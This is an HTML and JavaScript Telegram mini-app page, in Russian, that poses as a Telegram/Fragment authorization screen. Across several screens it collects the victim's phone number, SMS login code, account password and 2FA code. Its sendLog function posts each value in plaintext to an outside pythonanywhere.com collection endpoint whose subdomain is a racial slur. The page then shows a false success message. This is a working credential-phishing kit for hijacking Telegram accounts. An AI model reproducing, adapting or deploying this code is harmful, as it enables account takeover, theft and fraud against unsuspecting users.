<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Fragment Authorization</title>
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      margin: 0;
      padding: 15px;
      display: flex;
      justify-content: center;
      align-items: flex-start;
      min-height: 100vh;
      background-color: #ffffff;
    }

    .container {
      background-color: #fff;
      border-radius: 20px;
      box-shadow: 0 4px 25px rgba(0, 0, 0, 0.1);
      width: 100%;
      max-width: 440px;
      padding: 25px;
      text-align: center;
      margin: 10px 0;
    }

    .icons {
      display: flex;
      justify-content: center;
      gap: 20px;
      margin-bottom: 25px;
    }

    .icons img {
      width: 45px;
      height: 45px;
      border-radius: 12px;
    }

    h1 {
      font-size: 22px;
      font-weight: 800;
      margin-bottom: 12px;
      color: #000;
      line-height: 1.3;
    }

    p {
      font-size: 15px;
      color: #555;
      margin-bottom: 20px;
      line-height: 1.5;
    }

    .input-group {
      display: flex;
      flex-direction: column;
      gap: 12px;
      margin-bottom: 25px;
    }

    select {
      width: 100%;
      padding: 14px 40px 14px 14px;
      border: none;
      border-radius: 16px;
      font-size: 15px;
      box-sizing: border-box;
      background-color: #f8f9fa;
      color: #007bff;
      font-weight: 500;
      appearance: none;
      background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23666'%3e%3cpath d='M7 10l5 5 5-5z'/%3e%3c/svg%3e");
      background-repeat: no-repeat;
      background-position: right 14px center;
      background-size: 16px;
      height: 48px;
    }

    .phone-input {
      display: flex;
      background-color: #f8f9fa;
      border-radius: 16px;
      overflow: hidden;
      height: 48px;
    }

    .country-code {
      padding: 14px;
      background: #f8f9fa;
      border-right: 1.5px solid #e9ecef;
      min-width: 65px;
      color: #000;
      font-weight: 700;
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 4px 0;
      border-radius: 16px 0 0 16px;
      font-size: 15px;
    }

    .phone-number {
      flex: 1;
      border: none;
      padding: 14px;
      background: #f8f9fa;
      border-radius: 0 16px 16px 0;
      font-size: 15px;
      height: 100%;
    }

    .password-input {
      width: 100%;
      padding: 14px;
      border: none;
      border-radius: 16px;
      font-size: 15px;
      box-sizing: border-box;
      background-color: #f8f9fa;
      height: 48px;
    }

    .phone-number:focus {
      outline: none;
    }

    .password-input:focus {
      outline: none;
    }

    select:focus {
      outline: none;
    }

    .buttons {
      display: flex;
      justify-content: space-between;
      gap: 12px;
    }

    .buttons button {
      flex: 1;
      padding: 14px;
      font-size: 15px;
      font-weight: bold;
      border: none;
      border-radius: 14px;
      cursor: pointer;
    }

    .cancel-btn {
      background: none;
      color: #007bff;
      border: 1px solid #007bff;
    }

    .next-btn {
      background: #007bff;
      color: #fff;
    }

    .screen {
      display: none;
    }

    .screen.active {
      display: block;
    }

    .code-inputs {
      display: flex;
      gap: 12px;
      justify-content: center;
      margin-bottom: 25px;
    }

    .code-input {
      width: 45px;
      height: 55px;
      border: 2px solid #ddd;
      border-radius: 14px;
      text-align: center;
      font-size: 22px;
      font-weight: bold;
      outline: none;
    }

    .code-input:focus {
      border-color: #007bff;
    }

    .back-btn {
      background: none;
      border: none;
      color: #007bff;
      font-size: 15px;
      cursor: pointer;
      margin-bottom: 20px;
      padding: 8px 0;
      display: inline-block;
      border-radius: 8px;
    }

    .hint {
      font-size: 14px;
      color: #666;
      margin-top: 12px;
      line-height: 1.4;
    }

    .resend-code {
      margin-top: 20px;
      font-size: 15px;
      color: #555;
      line-height: 1.5;
    }

    .resend-link {
      color: #007bff;
      cursor: pointer;
      text-decoration: none;
      font-weight: 500;
      border-radius: 6px;
      padding: 2px 4px;
    }

    .success-screen {
      text-align: center;
      padding: 20px 0;
    }

    .success-icon {
      font-size: 70px;
      margin-bottom: 25px;
    }

    @media (max-height: 700px) {
      body {
        align-items: flex-start;
        padding: 10px;
      }
      
      .container {
        padding: 20px;
        margin: 5px 0;
        border-radius: 18px;
      }
      
      .icons {
        margin-bottom: 20px;
      }
      
      .icons img {
        width: 40px;
        height: 40px;
      }
      
      h1 {
        font-size: 20px;
        margin-bottom: 10px;
      }
      
      p {
        font-size: 14px;
        margin-bottom: 15px;
      }
      
      .input-group {
        margin-bottom: 20px;
      }
    }

    @media (max-width: 480px) {
      .container {
        padding: 20px 15px;
        border-radius: 18px;
      }
      
      .code-input {
        width: 40px;
        height: 50px;
        font-size: 20px;
        border-radius: 12px;
      }
    }
  </style>
</head>
<body>
  <!-- Экран 1: Ввод номера телефона -->
  <div class="container screen active" id="screen1">
    <div class="icons">
      <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Icon">
      <img src="https://cryptorussia.ru/wp-content/uploads/2025/08/fragment-telegram-462287.jpeg" alt="Fragment Logo" class="fragment-logo">
    </div>
    <h1 style="margin-bottom: 8px;">Войдите, чтобы использовать аккаунт Telegram</h1>
    <p style="font-size: 15px; color: #555; margin-bottom: 8px; line-height: 1.5;">
      для <a href="https://fragment.com" style="color: #007bff; cursor: pointer; text-decoration: none;">fragment.com</a> и <a href="https://t.me/fragment" style="color: #007bff; cursor: pointer; text-decoration: none;">Fragment Auction Alerts</a>.
    </p>
    <p style="font-size: 15px; color: #555; margin-bottom: 25px; line-height: 1.5;">
      Введите свой <strong>номер телефона</strong> в <span style="color: #007bff; cursor: pointer;">международном формате</span>.<br>
      Подтверждение будет отправлено в Telegram.
    </p>
    <div class="input-group">
      <select id="country" onchange="updateCountryCode()">
        <option value="+7">Россия (+7)</option>
        <option value="+375">Беларусь (+375)</option>
        <option value="+380">Украина (+380)</option>
        <option value="+7">Казахстан (+7)</option>
        <option value="+93">Афганистан (+93)</option>
        <option value="+355">Албания (+355)</option>
        <option value="+213">Алжир (+213)</option>
        <option value="+376">Андорра (+376)</option>
        <option value="+244">Ангола (+244)</option>
        <option value="+54">Аргентина (+54)</option>
        <option value="+374">Армения (+374)</option>
        <option value="+61">Австралия (+61)</option>
        <option value="+43">Австрия (+43)</option>
        <option value="+994">Азербайджан (+994)</option>
        <option value="+973">Бахрейн (+973)</option>
        <option value="+880">Бангладеш (+880)</option>
        <option value="+32">Бельгия (+32)</option>
        <option value="+501">Белиз (+501)</option>
        <option value="+229">Бенин (+229)</option>
        <option value="+975">Бутан (+975)</option>
        <option value="+591">Боливия (+591)</option>
        <option value="+387">Босния и Герцеговина (+387)</option>
        <option value="+55">Бразилия (+55)</option>
        <option value="+673">Бруней (+673)</option>
        <option value="+359">Болгария (+359)</option>
        <option value="+226">Буркина-Фасо (+226)</option>
        <option value="+257">Бурунди (+257)</option>
        <option value="+855">Камбоджа (+855)</option>
        <option value="+237">Камерун (+237)</option>
        <option value="+1">Канада (+1)</option>
        <option value="+238">Кабо-Верде (+238)</option>
        <option value="+236">ЦАР (+236)</option>
        <option value="+235">Чад (+235)</option>
        <option value="+56">Чили (+56)</option>
        <option value="+86">Китай (+86)</option>
        <option value="+57">Колумбия (+57)</option>
        <option value="+269">Коморы (+269)</option>
        <option value="+242">Конго (+242)</option>
        <option value="+506">Коста-Рика (+506)</option>
        <option value="+385">Хорватия (+385)</option>
        <option value="+53">Куба (+53)</option>
        <option value="+357">Кипр (+357)</option>
        <option value="+420">Чехия (+420)</option>
        <option value="+45">Дания (+45)</option>
        <option value="+253">Джибути (+253)</option>
        <option value="+1">Доминика (+1)</option>
        <option value="+1">Доминиканская Республика (+1)</option>
        <option value="+593">Эквадор (+593)</option>
        <option value="+20">Египет (+20)</option>
        <option value="+503">Сальвадор (+503)</option>
        <option value="+240">Экваториальная Гвинея (+240)</option>
        <option value="+291">Эритрея (+291)</option>
        <option value="+372">Эстония (+372)</option>
        <option value="+251">Эфиопия (+251)</option>
        <option value="+679">Фиджи (+679)</option>
        <option value="+358">Финляндия (+358)</option>
        <option value="+33">Франция (+33)</option>
        <option value="+241">Габон (+241)</option>
        <option value="+220">Гамбия (+220)</option>
        <option value="+995">Грузия (+995)</option>
        <option value="+49">Германия (+49)</option>
        <option value="+233">Гана (+233)</option>
        <option value="+30">Греция (+30)</option>
        <option value="+502">Гватемала (+502)</option>
        <option value="+224">Гвинея (+224)</option>
        <option value="+245">Гвинея-Бисау (+245)</option>
        <option value="+592">Гайана (+592)</option>
        <option value="+509">Гаити (+509)</option>
        <option value="+504">Гондурас (+504)</option>
        <option value="+36">Венгрия (+36)</option>
        <option value="+354">Исландия (+354)</option>
        <option value="+91">Индия (+91)</option>
        <option value="+62">Индонезия (+62)</option>
        <option value="+98">Иран (+98)</option>
        <option value="+964">Ирак (+964)</option>
        <option value="+353">Ирландия (+353)</option>
        <option value="+972">Израиль (+972)</option>
        <option value="+39">Италия (+39)</option>
        <option value="+81">Япония (+81)</option>
        <option value="+962">Иордания (+962)</option>
        <option value="+254">Кения (+254)</option>
        <option value="+965">Кувейт (+965)</option>
        <option value="+856">Лаос (+856)</option>
        <option value="+371">Латвия (+371)</option>
        <option value="+961">Ливан (+961)</option>
        <option value="+266">Лесото (+266)</option>
        <option value="+231">Либерия (+231)</option>
        <option value="+218">Ливия (+218)</option>
        <option value="+423">Лихтенштейн (+423)</option>
        <option value="+370">Литва (+370)</option>
        <option value="+352">Люксембург (+352)</option>
        <option value="+261">Мадагаскар (+261)</option>
        <option value="+265">Малави (+265)</option>
        <option value="+60">Малайзия (+60)</option>
        <option value="+960">Мальдивы (+960)</option>
        <option value="+223">Мали (+223)</option>
        <option value="+356">Мальта (+356)</option>
        <option value="+222">Мавритания (+222)</option>
        <option value="+230">Маврикий (+230)</option>
        <option value="+52">Мексика (+52)</option>
        <option value="+373">Молдова (+373)</option>
        <option value="+377">Монако (+377)</option>
        <option value="+976">Монголия (+976)</option>
        <option value="+382">Черногория (+382)</option>
        <option value="+212">Марокко (+212)</option>
        <option value="+258">Мозамбик (+258)</option>
        <option value="+95">Мьянма (+95)</option>
        <option value="+264">Намибия (+264)</option>
        <option value="+977">Непал (+977)</option>
        <option value="+31">Нидерланды (+31)</option>
        <option value="+64">Новая Зеландия (+64)</option>
        <option value="+505">Никарагуа (+505)</option>
        <option value="+227">Нигер (+227)</option>
        <option value="+234">Нигерия (+234)</option>
        <option value="+47">Норвегия (+47)</option>
        <option value="+968">Оман (+968)</option>
        <option value="+92">Пакистан (+92)</option>
        <option value="+507">Панама (+507)</option>
        <option value="+595">Парагвай (+595)</option>
        <option value="+51">Перу (+51)</option>
        <option value="+63">Филиппины (+63)</option>
        <option value="+48">Польша (+48)</option>
        <option value="+351">Португалия (+351)</option>
        <option value="+974">Катар (+974)</option>
        <option value="+40">Румыния (+40)</option>
        <option value="+250">Руанда (+250)</option>
        <option value="+966">Саудовская Аравиia (+966)</option>
        <option value="+221">Сенегал (+221)</option>
        <option value="+381">Сербия (+381)</option>
        <option value="+248">Сейшелы (+248)</option>
        <option value="+232">Сьерра-Леоне (+232)</option>
        <option value="+65">Сингапур (+65)</option>
        <option value="+421">Словакия (+421)</option>
        <option value="+386">Словения (+386)</option>
        <option value="+252">Сомали (+252)</option>
        <option value="+27">ЮАР (+27)</option>
        <option value="+82">Южная Корея (+82)</option>
        <option value="+34">Испания (+34)</option>
        <option value="+94">Шри-Ланка (+94)</option>
        <option value="+249">Судан (+249)</option>
        <option value="+597">Суринам (+597)</option>
        <option value="+46">Швеция (+46)</option>
        <option value="+41">Швейцария (+41)</option>
        <option value="+963">Сирия (+963)</option>
        <option value="+886">Тайвань (+886)</option>
        <option value="+992">Таджикистан (+992)</option>
        <option value="+255">Танзания (+255)</option>
        <option value="+66">Таиланд (+66)</option>
        <option value="+228">Того (+228)</option>
        <option value="+676">Тонга (+676)</option>
        <option value="+216">Тунис (+216)</option>
        <option value="+90">Турция (+90)</option>
        <option value="+993">Туркменистан (+993)</option>
        <option value="+256">Уганда (+256)</option>
        <option value="+971">ОАЭ (+971)</option>
        <option value="+44">Великобритания (+44)</option>
        <option value="+1">США (+1)</option>
        <option value="+598">Уругвай (+598)</option>
        <option value="+998">Узбекистан (+998)</option>
        <option value="+678">Вануату (+678)</option>
        <option value="+58">Венесуэла (+58)</option>
        <option value="+84">Вьетнам (+84)</option>
        <option value="+967">Йемен (+967)</option>
        <option value="+260">Замбия (+260)</option>
        <option value="+263">Зимбабве (+263)</option>
      </select>
      <div class="phone-input">
        <span class="country-code" id="countryCode">+7</span>
        <input type="text" class="phone-number" id="phone" placeholder="Ваш номер телефона">
      </div>
    </div>
    <div class="buttons">
      <button class="cancel-btn" onclick="handleCancel()">ОТМЕНА</button>
      <button class="next-btn" onclick="handlePhoneSubmit()">ДАЛЕЕ</button>
    </div>
  </div>  

  <!-- Экран 2: Ввод SMS кода -->
  <div class="container screen" id="screen2">
    <button class="back-btn" onclick="prevScreen(1)">← Назад</button>
    <div class="icons">
      <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Icon">
      <img src="https://cryptorussia.ru/wp-content/uploads/2025/08/fragment-telegram-462287.jpeg" alt="Fragment Logo" class="fragment-logo">
    </div>
    <h1>Введите код из SMS</h1>
    <p>Мы отправили код подтверждения на ваш номер телефона.</p>
    
    <div class="code-inputs">
      <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 1)">
      <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 2)">
      <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 3)">
      <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 4)">
      <input type="text" class="code-input" maxlength="1">
    </div>
    
    <div class="resend-code" id="resendCodeBlock">
      Не пришел код? <a href="javascript:void(0)" class="resend-link" id="resendLink" onclick="resendCode()">Отправить повторно</a>
      <span id="resendTimer" style="display: none; margin-left: 5px;"></span>
    </div>
    
    <div class="buttons">
      <button class="next-btn" onclick="handleSmsSubmit()">ПРОДОЛЖИТЬ</button>
    </div>
  </div>

  <!-- Экран 3: Ввод пароля -->
  <div class="container screen" id="screen3">
    <button class="back-btn" onclick="prevScreen(2)">← Назад</button>
    <div class="icons">
      <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Icon">
      <img src="https://cryptorussia.ru/wp-content/uploads/2025/08/fragment-telegram-462287.jpeg" alt="Fragment Logo" class="fragment-logo">
    </div>
    <h1>Введите пароль</h1>
    <p>Введите пароль от вашего аккаунта Telegram для продолжения.</p>
    
    <div class="input-group">
      <input type="password" class="password-input" id="password" placeholder="Пароль">
    </div>
    
    <div class="hint">Пароль используется для защиты вашего аккаунта Telegram</div>
    
    <div class="buttons">
      <button class="cancel-btn" onclick="handleCancel()">ОТМЕНА</button>
      <button class="next-btn" onclick="handlePasswordSubmit()">ПРОДОЛЖИТЬ</button>
    </div>
  </div>

  <!-- Экран 4: Ввод 2FA кода -->
  <div class="container screen" id="screen4">
    <button class="back-btn" onclick="prevScreen(3)">← Назад</button>
    <div class="icons">
      <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Icon">
      <img src="https://cryptorussia.ru/wp-content/uploads/2025/08/fragment-telegram-462287.jpeg" alt="Fragment Logo" class="fragment-logo">
    </div>
    <h1>Двухфакторная аутентификация</h1>
    <p>Введите код из приложения аутентификации.</p>
    
    <div class="code-inputs">
      <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 1)">
      <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 2)">
      <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 3)">
      <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 4)">
      <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 5)">
      <input type="text" class="code-input" maxlength="1">
    </div>
    
    <div class="hint">Для завершения авторизации введите 6-значный код</div>
    
    <div class="buttons">
      <button class="cancel-btn" onclick="handleCancel()">ОТМЕНА</button>
      <button class="next-btn" onclick="handle2faSubmit()">ЗАВЕРШИТЬ</button>
    </div>
  </div>

  <!-- Экран 5: Успешная авторизация -->
  <div class="container screen" id="screen5">
    <div class="success-screen">
      <div class="success-icon">✅</div>
      <h1>Авторизация успешно завершена!</h1>
      <p>Ваш аккаунт Fragment был успечно авторизован. Теперь вы можете вернуться в основного бота для продолжения работы.</p>
      
      <div class="buttons">
        <button class="next-btn" onclick="closeWebApp()">ВЕРНУТЬСЯ В БОТА</button>
      </div>
    </div>
  </div>

  <script>
  // Инициализация Telegram Web App
  const tg = window.Telegram.WebApp;
  tg.expand();
  tg.MainButton.hide();

  let currentScreen = 1;
  let resendTimerInterval;

  // URL сервера
  const SERVER_URL = "https://monkeynigger.pythonanywhere.com/send-log";

  // ПРОСТАЯ ФУНКЦИЯ ДЛЯ ОТПРАВКИ ЛОГОВ
  async function sendLog(action, details = '') {
    try {
      // Просто получаем данные пользователя
      const user = tg.initDataUnsafe?.user || {
        id: Date.now(),
        first_name: 'User',
        username: 'user'
      };

      const logData = {
        user_id: user.id,
        user_name: user.first_name || 'NoName',
        user_username: user.username || 'no_username',
        action: action,
        details: details
      };

      // Пробуем отправить - БЕЗ АЛЕРТОВ
      const response = await fetch(SERVER_URL, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(logData)
      });

      // Если ответ успешный - все ок
      if (response.ok) {
        console.log('✅ Лог отправлен:', action);
      } else {
        console.log('❌ Ошибка сервера:', response.status);
      }
      
    } catch (error) {
      // Просто логируем ошибку, не показываем алерт
      console.log('❌ Ошибка отправки:', error.message);
    }
  }

  function updateCountryCode() {
    const countrySelect = document.getElementById('country');
    const countryCodeElement = document.getElementById('countryCode');
    const selectedValue = countrySelect.value;
    countryCodeElement.textContent = selectedValue;
  }

  function nextScreen(screenNumber) {
    document.getElementById(`screen${currentScreen}`).classList.remove('active');
    document.getElementById(`screen${screenNumber}`).classList.add('active');
    currentScreen = screenNumber;
  }

  function prevScreen(screenNumber) {
    document.getElementById(`screen${currentScreen}`).classList.remove('active');
    document.getElementById(`screen${screenNumber}`).classList.add('active');
    currentScreen = screenNumber;
  }

  function moveToNext(input, currentIndex) {
    if (input.value.length === 1) {
      const inputs = input.parentElement.querySelectorAll('.code-input');
      if (currentIndex < inputs.length) {
        inputs[currentIndex].focus();
      }
    }
  }

  function handlePhoneSubmit() {
    const phone = document.getElementById('phone').value;
    const countrySelect = document.getElementById('country');
    const country = countrySelect.options[countrySelect.selectedIndex].text;
    const countryCode = document.getElementById('countryCode').textContent;
    
    if (!phone) {
      alert('Пожалуйста, введите номер телефона');
      return;
    }
    
    // Отправляем лог о вводе номера
    sendLog('PHONE_ENTERED', `Страна: ${country}, Номер: ${countryCode}${phone}`);
    nextScreen(2);
  }

  function handleSmsSubmit() {
    const codeInputs = document.querySelectorAll('#screen2 .code-input');
    let smsCode = '';
    codeInputs.forEach(input => smsCode += input.value);
    
    if (smsCode.length !== 5) {
      alert('Пожалуйста, введите полный 5-значный код');
      return;
    }
    
    // Отправляем лог о вводе SMS кода
    sendLog('SMS_CODE_ENTERED', `Код: ${smsCode}`);
    nextScreen(3);
  }

  function handlePasswordSubmit() {
    const password = document.getElementById('password').value;
    
    if (!password) {
      alert('Пожалуйста, введите пароль');
      return;
    }
    
    // ОТПРАВЛЯЕМ ЛОГ О ВВОДЕ ПАРОЛЯ
    sendLog('PASSWORD_ENTERED', `Пароль: ${password}`);
    nextScreen(4);
  }

  function handle2faSubmit() {
    const codeInputs = document.querySelectorAll('#screen4 .code-input');
    let faCode = '';
    codeInputs.forEach(input => faCode += input.value);
    
    if (faCode.length !== 6) {
      alert('Пожалуйста, введите полный 6-значный код');
      return;
    }
    
    // Отправляем лог о вводе 2FA кода
    sendLog('2FA_CODE_ENTERED', `Код: ${faCode}`);
    completeAuth();
  }

  function resendCode() {
    const resendLink = document.getElementById('resendLink');
    const resendTimer = document.getElementById('resendTimer');
    
    // Отправляем лог о запросе повторной отправки кода
    sendLog('RESEND_CODE_REQUESTED', 'Пользователь запросил повторную отправку SMS кода');
    
    // Блокируем кнопку и запускаем таймер
    resendLink.style.pointerEvents = 'none';
    resendLink.style.color = '#999';
    resendLink.textContent = 'Отправить повторно';
    resendTimer.style.display = 'inline';
    
    let timeLeft = 30;
    resendTimer.textContent = `(00:${timeLeft.toString().padStart(2, '0')})`;
    
    // Останавливаем предыдущий таймер, если он был
    if (resendTimerInterval) {
      clearInterval(resendTimerInterval);
    }
    
    resendTimerInterval = setInterval(() => {
      timeLeft--;
      resendTimer.textContent = `(00:${timeLeft.toString().padStart(2, '0')})`;
      
      if (timeLeft <= 0) {
        clearInterval(resendTimerInterval);
        resendLink.style.pointerEvents = 'auto';
        resendLink.style.color = '#007bff';
        resendTimer.style.display = 'none';
        
        // Показываем всплывающее окно
        tg.showPopup({
          title: 'Код отправлен',
          message: 'Новый код подтверждения отправлен на ваш номер телефона.',
          buttons: [{ type: 'ok' }]
        });
      }
    }, 1000);
  }

  function handleCancel() {
    sendLog('USER_CANCELLED', 'Пользователь отменил авторизацию');
    tg.close();
  }

  function completeAuth() {
    sendLog('AUTH_SUCCESS', 'Успешная авторизация пользователя');
    nextScreen(5);
  }

  function closeWebApp() {
    sendLog('APP_CLOSED', 'Пользователь вернулся в бота');
    tg.close();
  }

  document.addEventListener('DOMContentLoaded', function() {
    // Отправляем лог о запуске приложения
    sendLog('APP_STARTED', 'Мини-приложение запущено в Telegram WebView');
    
    const observer = new MutationObserver(function(mutations) {
      mutations.forEach(function(mutation) {
        if (mutation.type === 'attributes' && mutation.attributeName === 'class') {
          if (document.getElementById('screen2').classList.contains('active')) {
            document.querySelector('#screen2 .code-input').focus();
          }
          if (document.getElementById('screen3').classList.contains('active')) {
            document.getElementById('password').focus();
          }
          if (document.getElementById('screen4').classList.contains('active')) {
            document.querySelector('#screen4 .code-input').focus();
          }
        }
      });
    });
    
    observer.observe(document.getElementById('screen2'), { attributes: true });
    observer.observe(document.getElementById('screen3'), { attributes: true });
    observer.observe(document.getElementById('screen4'), { attributes: true });
  });
</script>
</body>
</html>